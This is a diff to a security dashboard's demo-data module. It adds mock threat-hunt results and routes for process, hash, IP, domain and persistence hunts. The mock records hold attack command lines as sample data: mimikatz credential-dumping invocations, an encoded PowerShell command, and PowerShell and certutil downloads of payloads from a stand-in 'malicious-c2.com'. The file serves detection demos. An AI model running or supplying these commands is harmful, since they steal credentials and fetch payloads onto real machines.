@@ -209,6 +209,69 @@ const DEMO_REPORT_SUMMARY = {
 
 const DEMO_ORG = { id: 9999, name: 'Netcradus Demo', api_key: 'demo-api-key-****', is_active: true }
 
+// ── Threat Hunt mock data ──────────────────────────────────────────────────────
+
+const DEMO_HUNT_PROCESS = {
+  query: { name: 'mimikatz', days: 7 },
+  total: 3,
+  hits: [
+    { id: 1, agent_id: 1, agent_hostname: 'WIN-DC-01',      pid: 4892, ppid: 4200, process_name: 'mimikatz.exe',    parent_process_name: 'cmd.exe', cmdline: 'mimikatz.exe "sekurlsa::logonpasswords" exit', exe_path: 'C:\\Windows\\Temp\\mimikatz.exe',  username: 'CORP\\Administrator', sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', timestamp: hAgo(2.5) },
+    { id: 2, agent_id: 2, agent_hostname: 'WIN-WORKST-01',  pid: 3120, ppid: 2800, process_name: 'mimikatz.exe',    parent_process_name: 'explorer.exe', cmdline: 'mimikatz.exe privilege::debug sekurlsa::wdigest', exe_path: 'C:\\Users\\Public\\mimikatz.exe', username: 'CORP\\jdoe', sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', timestamp: hAgo(3.1) },
+    { id: 3, agent_id: 1, agent_hostname: 'WIN-DC-01',      pid: 5504, ppid: 4892, process_name: 'powershell.exe',  parent_process_name: 'mimikatz.exe', cmdline: 'powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0', exe_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', username: 'CORP\\Administrator', sha256: null, timestamp: hAgo(2.4) },
+  ],
+}
+
+const DEMO_HUNT_HASH = {
+  query: { value: 'e3b0c44298fc1c149afbf4c8996fb924', days: 30 },
+  total: 4,
+  unique_agents: 2,
+  hits: [
+    { source: 'process', id: 1, agent_id: 1, agent_hostname: 'WIN-DC-01',     process_name: 'mimikatz.exe', cmdline: 'mimikatz.exe "sekurlsa::logonpasswords"', exe_path: 'C:\\Windows\\Temp\\mimikatz.exe',  sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: null, file_path: null, event_type: null, timestamp: hAgo(2.5) },
+    { source: 'process', id: 2, agent_id: 2, agent_hostname: 'WIN-WORKST-01', process_name: 'mimikatz.exe', cmdline: 'mimikatz.exe privilege::debug', exe_path: 'C:\\Users\\Public\\mimikatz.exe',            sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: null, file_path: null, event_type: null, timestamp: hAgo(3.1) },
+    { source: 'file',    id: 5, agent_id: 1, agent_hostname: 'WIN-DC-01',     process_name: null, cmdline: null, exe_path: null, sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: '098f6bcd4621d373cade4e832627b4f6', file_path: 'C:\\Windows\\Temp\\mimikatz.exe',  event_type: 'create', timestamp: hAgo(4) },
+    { source: 'file',    id: 6, agent_id: 2, agent_hostname: 'WIN-WORKST-01', process_name: null, cmdline: null, exe_path: null, sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: '098f6bcd4621d373cade4e832627b4f6', file_path: 'C:\\Users\\Public\\mimikatz.exe', event_type: 'create', timestamp: hAgo(5) },
+  ],
+}
+
+const DEMO_HUNT_IP = {
+  query: { value: '185.220.101.42', port: null, days: 7 },
+  summary: {
+    unique_agents:     3,
+    total_connections: 17,
+    unique_ports:      [443, 4444, 8080],
+    first_seen:        hAgo(7),
+    last_seen:         hAgo(1),
+  },
+  total: 5,
+  hits: [
+    { id: 10, agent_id: 1, agent_hostname: 'WIN-DC-01',     local_ip: '10.0.0.1',      remote_ip: '185.220.101.42', remote_port: 4444, protocol: 'TCP', timestamp: hAgo(1.2) },
+    { id: 11, agent_id: 2, agent_hostname: 'WIN-WORKST-01', local_ip: '192.168.1.101', remote_ip: '185.220.101.42', remote_port: 4444, protocol: 'TCP', timestamp: hAgo(2.8) },
+    { id: 12, agent_id: 3, agent_hostname: 'LINUX-WEB-01',  local_ip: '192.168.1.50',  remote_ip: '185.220.101.42', remote_port: 443,  protocol: 'TCP', timestamp: hAgo(3.5) },
+    { id: 13, agent_id: 1, agent_hostname: 'WIN-DC-01',     local_ip: '10.0.0.1',      remote_ip: '185.220.101.42', remote_port: 8080, protocol: 'TCP', timestamp: hAgo(5) },
+    { id: 14, agent_id: 3, agent_hostname: 'LINUX-WEB-01',  local_ip: '192.168.1.50',  remote_ip: '185.220.101.42', remote_port: 4444, protocol: 'TCP', timestamp: hAgo(7) },
+  ],
+}
+
+const DEMO_HUNT_DOMAIN = {
+  query: { value: 'malicious-c2.com', days: 7 },
+  total: 3,
+  unique_agents: 2,
+  hits: [
+    { source: 'process_cmdline', id: 20, agent_id: 1, agent_hostname: 'WIN-DC-01',     process_name: 'powershell.exe', cmdline: 'powershell.exe Invoke-WebRequest http://malicious-c2.com/stage2.ps1 -OutFile C:\\Temp\\stage2.ps1', username: 'CORP\\Administrator', file_path: null, event_type: null, timestamp: hAgo(2) },
+    { source: 'process_cmdline', id: 21, agent_id: 2, agent_hostname: 'WIN-WORKST-01', process_name: 'cmd.exe',        cmdline: 'certutil.exe -urlcache -split -f http://malicious-c2.com/payload.exe C:\\Temp\\payload.exe',          username: 'CORP\\jdoe',          file_path: null, event_type: null, timestamp: hAgo(3.5) },
+    { source: 'file_path',       id: 22, agent_id: 1, agent_hostname: 'WIN-DC-01',     process_name: null,             cmdline: null, username: null, file_path: 'C:\\Temp\\malicious-c2.com_payload.exe', event_type: 'create', timestamp: hAgo(2.1) },
+  ],
+}
+
+const DEMO_HUNT_PERSISTENCE = {
+  query: { persistence_type: 'registry', days: 7 },
+  total: 2,
+  hits: [
+    { id: 30, agent_id: 1, agent_hostname: 'WIN-DC-01',     persistence_type: 'registry', entry_name: 'WindowsUpdate', entry_path: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate', timestamp: hAgo(6) },
+    { id: 31, agent_id: 5, agent_hostname: 'WIN-SERVER-02', persistence_type: 'service',  entry_name: 'NetSvc32',      entry_path: 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetSvc32',                    timestamp: hAgo(9) },
+  ],
+}
+
 // ── Router ────────────────────────────────────────────────────────────────────
 
 export function resolveDemoResponse<T>(path: string, method = 'GET'): T {
@@ -295,6 +358,13 @@ export function resolveDemoResponse<T>(path: string, method = 'GET'): T {
   if (base.startsWith('/commands'))        return DEMO_COMMANDS         as unknown as T
   if (base.startsWith('/support'))         return []                    as unknown as T
   if (base.startsWith('/platform'))        return []                    as unknown as T
+
+  // ── GET: Threat hunt endpoints ────────────────────────────────────────────
+  if (base === '/hunt/process')     return DEMO_HUNT_PROCESS     as unknown as T
+  if (base === '/hunt/hash')        return DEMO_HUNT_HASH        as unknown as T
+  if (base === '/hunt/ip')          return DEMO_HUNT_IP          as unknown as T
+  if (base === '/hunt/domain')      return DEMO_HUNT_DOMAIN      as unknown as T
+  if (base === '/hunt/persistence') return DEMO_HUNT_PERSISTENCE as unknown as T
 
   return [] as unknown as T
 }
